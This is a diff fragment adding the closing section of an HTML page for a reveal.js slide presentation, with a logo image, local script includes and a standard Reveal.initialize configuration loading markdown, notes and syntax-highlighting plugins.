+			</div>
+
+		  <div class='logo'>
+        <img src="img/logo.png" style="background: none; border: none; box-shadow: 0 0 0 0 #fff; width: 15%;"/>
+		  </div>
+
+			</div>
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+        history: true,
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
+				]
+			});
+		</script>
+	</body>
+</html>
